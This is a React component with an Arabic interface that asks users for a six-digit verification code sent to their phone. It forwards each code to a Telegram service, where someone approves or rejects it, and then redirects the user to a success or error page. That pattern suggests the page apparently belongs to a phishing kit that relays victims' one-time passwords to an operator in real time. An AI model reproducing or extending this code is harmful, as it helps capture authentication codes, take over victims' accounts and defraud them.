import { CircleAlert, Clock } from "lucide-react";
import { useEffect, useState } from "react";
import OtpInput from "react-otp-input";
import { useNavigate } from "react-router-dom";
import { sendOTPToTelegram } from "../services/telegram";
import { useAppState } from "../store/AppStateContext";
import { CONSTANTS } from "../types";

/**
 * OTP Input Component
 *
 * Handles the verification of one-time passwords with features like:
 * - Custom OTP input with visual feedback
 * - Countdown timer with auto-expiry
 * - Retry mechanism with attempt limiting
 * - Error handling and feedback
 */
const OTPInputComponent = () => {
  const navigate = useNavigate();
  const { otp, requestId, setStatus, setError } = useAppState();
  const [inputValue, setInputValue] = useState("");
  const [attempts, setAttempts] = useState(0);
  const [timeRemaining, setTimeRemaining] = useState(
    CONSTANTS.OTP.RESEND_COOLDOWN_SECONDS
  );
  const [isVerifying, setIsVerifying] = useState(false);
  const [otpError, setOtpError] = useState<string | null>(null);

  /**
   * Handles OTP verification
   * Verifies OTP locally if available, otherwise sends to Telegram for verification
   */
  const handleVerify = async () => {
    if (!requestId) {
      setError("رقم الطلب غير صالح. يرجى المحاولة مرة أخرى.");
      return;
    }

    setIsVerifying(true);
    setOtpError(null);

    try {
      // If otp is already set in AppState, verify locally for faster experience
      if (otp && inputValue === otp) {
        setStatus("completed");
        // Redirect user to success page after delay
        setTimeout(() => {
          navigate("/success");
        }, CONSTANTS.OTP.AUTO_REDIRECT_DELAY_MS);
        return;
      }

      // Otherwise, send OTP to Telegram for verification
      const response = await sendOTPToTelegram(requestId, inputValue);

      if (response.status === "approved") {
        setStatus("completed");
        setTimeout(() => {
          navigate("/success");
        }, CONSTANTS.OTP.AUTO_REDIRECT_DELAY_MS);
      } else {
        // Handle rejection with attempt counting
        const newAttempts = attempts + 1;
        setAttempts(newAttempts);

        if (newAttempts >= CONSTANTS.OTP.MAX_ATTEMPTS) {
          setStatus("rejected");
          navigate("/error");
        } else {
          // Show remaining attempts to user
          setOtpError(
            `رمز التحقق غير صحيح. لديك ${
              CONSTANTS.OTP.MAX_ATTEMPTS - newAttempts
            } محاولات متبقية.`
          );
          setInputValue("");
        }
      }
    } catch (error) {
      if (error instanceof Error) {
        setOtpError(error.message);
      } else {
        setOtpError("حدث خطأ أثناء التحقق من الرمز. يرجى المحاولة مرة أخرى.");
      }
      setInputValue("");
    } finally {
      setIsVerifying(false);
    }
  };

  // Countdown timer for OTP expiration
  useEffect(() => {
    let timer: NodeJS.Timeout;
    if (timeRemaining > 0) {
      timer = setInterval(() => {
        setTimeRemaining((prev: number) => prev - 1);
      }, 1000);
    }
    return () => {
      if (timer) clearInterval(timer);
    };
  }, [timeRemaining]);

  // Auto-submit OTP when all digits are entered
  useEffect(() => {
    if (inputValue.length === CONSTANTS.OTP.LENGTH && !isVerifying) {
      handleVerify();
    }
  }, [inputValue]);

  return (
    <div className="flex flex-col items-center justify-center py-6">
      <h2 className="text-xl font-semibold text-gray-800 mb-2 text-center">
        أدخل رمز التحقق
      </h2>
      <p className="text-gray-600 mb-6 text-center">
        يرجى إدخال رمز التحقق المكون من 6 أرقام المرسل إلى هاتفك
      </p>

      <div className="mb-6 w-full">
        <OtpInput
          value={inputValue}
          onChange={setInputValue}
          numInputs={CONSTANTS.OTP.LENGTH}
          renderSeparator={<span className="w-2"></span>}
          renderInput={(props) => (
            <input
              {...props}
              className="w-12 h-12 text-center border border-gray-300 rounded-md text-xl font-semibold focus:outline-none focus:ring-2 focus:ring-primary focus:border-primary transition-all duration-200 sm:w-14 sm:h-14"
              style={{ direction: "ltr" }}
              autoComplete="one-time-code"
            />
          )}
          containerStyle="flex justify-center gap-2 sm:gap-3"
        />
      </div>

      {otpError && (
        <div className="mb-4 w-full bg-red-50 border-l-4 border-red-500 p-3 rounded animate-fadeIn">
          <div className="flex items-center">
            <CircleAlert
              size={20}
              className="text-red-500 mr-2 rtl:ml-2 rtl:mr-0 flex-shrink-0"
            />
            <p className="text-red-700 text-sm">{otpError}</p>
          </div>
        </div>
      )}

      <button
        className={`w-full py-3 px-4 text-white bg-primary rounded-lg hover:bg-primary-light focus:outline-none focus:ring-2 focus:ring-primary focus:ring-offset-2 transition-all duration-300 shadow-sm ${
          isVerifying || inputValue.length !== CONSTANTS.OTP.LENGTH
            ? "opacity-70 cursor-not-allowed"
            : "hover:shadow-md"
        }`}
        onClick={handleVerify}
        disabled={isVerifying || inputValue.length !== CONSTANTS.OTP.LENGTH}
      >
        {isVerifying ? (
          <div className="flex items-center justify-center">
            <svg
              className="animate-spin -ml-1 mr-2 h-4 w-4 text-white"
              xmlns="http://www.w3.org/2000/svg"
              fill="none"
              viewBox="0 0 24 24"
            >
              <circle
                className="opacity-25"
                cx="12"
                cy="12"
                r="10"
                stroke="currentColor"
                strokeWidth="4"
              ></circle>
              <path
                className="opacity-75"
                fill="currentColor"
                d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
              ></path>
            </svg>
            جاري التحقق...
          </div>
        ) : (
          "تحقق من الرمز"
        )}
      </button>

      <div className="mt-4 text-center">
        {timeRemaining > 0 ? (
          <div className="flex items-center justify-center text-gray-600">
            <Clock size={16} className="mr-2 rtl:ml-2 rtl:mr-0" />
            <p>
              ينتهي الرمز خلال: {Math.floor(timeRemaining / 60)}:
              {(timeRemaining % 60).toString().padStart(2, "0")}
            </p>
          </div>
        ) : (
          <button
            className="text-primary hover:text-primary-light focus:outline-none transition-colors"
            onClick={() => {
              // Reset timer
              setTimeRemaining(CONSTANTS.OTP.RESEND_COOLDOWN_SECONDS);
              // Reset OTP error
              setOtpError(null);
              // Reset input
              setInputValue("");
            }}
          >
            إعادة إرسال الرمز
          </button>
        )}
      </div>
    </div>
  );
};

export default OTPInputComponent;
